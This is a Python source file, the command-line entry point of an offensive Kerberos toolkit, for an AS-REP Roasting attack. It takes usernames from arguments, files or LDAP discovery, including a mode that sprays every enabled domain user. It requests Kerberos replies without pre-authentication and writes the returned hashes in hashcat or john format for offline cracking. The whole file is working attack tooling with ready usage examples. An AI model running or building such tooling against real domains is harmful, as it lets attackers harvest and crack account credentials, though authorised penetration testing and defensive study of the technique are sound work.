"""CLI entry point for ``kw-asrep`` - AS-REP Roast."""

from __future__ import annotations

import argparse
import sys

from kerbwolf import __version__
from kerbwolf.attacks.asreproast import asreproast
from kerbwolf.cli._common import collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, print_header, resolve_context
from kerbwolf.core.ldap import find_asreproastable
from kerbwolf.log import Logger
from kerbwolf.models import ETYPE_BY_NAME, HashFormat, KerberosContext, KerbWolfError, TransportProtocol


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="kw-asrep",
        description="AS-REP Roast - extract hashes from accounts without Kerberos pre-authentication.",
        epilog="Examples:\n  kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith\n  kw-asrep -d CORP.LOCAL -T users.txt -o hashes.txt\n  kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap\n  kw-asrep -k -c admin.ccache --ldap\n",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v, -vv)")

    # -- Targets (no auth needed for the attack itself) --
    grp = parser.add_argument_group(
        "targets (no authentication required)",
        "The attack sends AS-REQs without pre-auth. Accounts that require pre-auth are silently skipped.",
    )
    grp.add_argument("-t", "--target", action="append", metavar="USER", help="Target username (repeatable)")
    grp.add_argument("-T", "--targets-file", metavar="FILE", help="File with usernames, one per line (# comments, blank lines skipped)")

    # -- LDAP discovery (requires auth) --
    grp = parser.add_argument_group(
        "LDAP discovery (requires authentication)",
        "Query LDAP to find DONT_REQUIRE_PREAUTH accounts or spray all users.",
    )
    grp.add_argument("--ldap", action="store_true", help="Discover accounts with DONT_REQUIRE_PREAUTH set")
    grp.add_argument("--ldap-all", action="store_true", help="Try every enabled user (spray)")
    grp.add_argument("--ldap-ssl", action="store_true", help="Use LDAPS (port 636)")

    # -- NTLM auth (for LDAP) --
    grp = parser.add_argument_group(
        "NTLM authentication (for LDAP)",
    )
    grp.add_argument("-u", "--user", metavar="USER", help="Username (sAMAccountName)")
    grp.add_argument("-p", "--password", metavar="PASS", help="Cleartext password")
    grp.add_argument("-H", "--hashes", metavar="HASH", help="NTLM hash - LM:NT, :NT, or NT")

    # -- Kerberos auth (for LDAP) --
    grp = parser.add_argument_group(
        "Kerberos authentication (for LDAP)",
        "Domain and user are auto-detected from the ccache.",
    )
    grp.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos auth via ccache")
    grp.add_argument("-c", "--ccache", metavar="FILE", help="CCache file with TGT (or set KRB5CCNAME)")

    # -- Connection --
    grp = parser.add_argument_group("connection")
    grp.add_argument("-d", "--domain", help="Domain FQDN (auto-detected from ccache with -k)")
    grp.add_argument("--dc-ip", metavar="IP", help="DC IP or hostname (resolved via DNS SRV if omitted)")
    grp.add_argument("--dc-hostname", metavar="HOST", help="DC FQDN for Kerberos SPN (auto-detected if omitted)")
    grp.add_argument("--transport", choices=["tcp", "udp"], default="tcp", help="Transport protocol (default: tcp)")
    grp.add_argument("--timeout", type=float, default=10.0, help="Network timeout in seconds (default: 10)")

    # -- Output --
    grp = parser.add_argument_group("output")
    grp.add_argument("-e", "--enctype", choices=["des-cbc-crc", "des-cbc-md5", "rc4", "aes128", "aes256"], default="rc4", help="Encryption type (default: rc4)")
    grp.add_argument("-o", "--output", metavar="FILE", help="Write hashes to file")
    grp.add_argument("--format", choices=["hashcat", "john"], default="hashcat", dest="hash_format", help="Hash output format (default: hashcat)")

    return parser


def _validate(args: argparse.Namespace, logger: Logger) -> None:
    """Validate argument combinations before doing any work."""
    has_ntlm = args.user and (args.password or args.hashes)
    has_kerberos = args.kerberos
    has_ldap = args.ldap or args.ldap_all
    has_targets = args.target or args.targets_file

    if args.ccache and not args.kerberos:
        logger.warning("-c/--ccache provided without -k/--kerberos. Add -k to use Kerberos auth.")

    # NTLM auth requires both user and secret
    if args.user and not args.password and not args.hashes and not has_kerberos:
        logger.error("-u/--user requires -p/--password or -H/--hashes.")
        sys.exit(1)

    # LDAP requires auth
    if has_ldap and not has_ntlm and not has_kerberos:
        logger.error("--ldap/--ldap-all requires authentication. Use -u/-p (NTLM) or -k (Kerberos).")
        sys.exit(1)

    # Must have something to do
    if not has_targets and not has_ldap:
        logger.error("No targets. Use -t USER, -T FILE, --ldap, or --ldap-all.")
        sys.exit(1)


def main(argv: list[str] | None = None) -> None:
    """Entry point for ``kw-asrep``."""
    parser = _build_parser()
    args = parser.parse_args(argv)
    logger = Logger(args.verbose)
    _validate(args, logger)
    ctx = resolve_context(args, logger)

    targets = collect_targets(args)

    if args.ldap or args.ldap_all:
        targets.extend(_ldap_discover(args, logger, ctx))

    targets = list(dict.fromkeys(targets))

    etype = ETYPE_BY_NAME[args.enctype]
    transport = TransportProtocol(args.transport)
    hash_format = HashFormat(args.hash_format)

    # -- header --
    target_desc = f"{len(targets)} target(s)"
    if args.ldap:
        target_desc += " (LDAP)"
    elif args.ldap_all:
        target_desc += " (LDAP spray)"
    print_header(
        "kw-asrep",
        [
            ("Attack", "AS-REP Roast"),
            ("Domain", ctx.domain),
            ("DC", f"{ctx.dc_hostname} ({ctx.dc_ip})" if ctx.dc_hostname else ctx.dc_ip),
            ("Etype", etype.name),
            ("Targets", target_desc),
            ("Transport", transport.value),
            ("Format", hash_format.value),
            *([("Output", args.output)] if args.output else []),
        ],
    )

    logger.info("AS-REP Roast (etype: %s, targets: %d)", etype.name, len(targets))

    try:
        results = asreproast(
            domain=ctx.domain,
            dc_ip=ctx.dc_ip,
            etype=etype,
            target_users=targets,
            hash_format=hash_format,
            transport=transport,
            timeout=ctx.timeout,
        )
    except KerbWolfError as exc:
        logger.error("%s", exc)  # noqa: TRY400
        sys.exit(1)
    except Exception:
        logger.exception("Unexpected error")
        sys.exit(1)

    output_results(results, args.output, logger)


def _ldap_discover(args: argparse.Namespace, logger: Logger, ctx: KerberosContext) -> list[str]:
    """Enumerate AS-REP roastable users via LDAP."""
    if args.ldap_all:
        return ldap_discover_all_users(args, logger, ctx)

    conn = ldap_connect_from_args(args, logger, ctx)

    logger.info("LDAP: querying DONT_REQUIRE_PREAUTH users in %s", ctx.domain)
    accounts = find_asreproastable(conn, ctx.domain)
    usernames = [a.samaccountname for a in accounts]
    logger.info("LDAP: found %d AS-REP roastable accounts", len(usernames))
    conn.unbind()
    return usernames


if __name__ == "__main__":
    main()
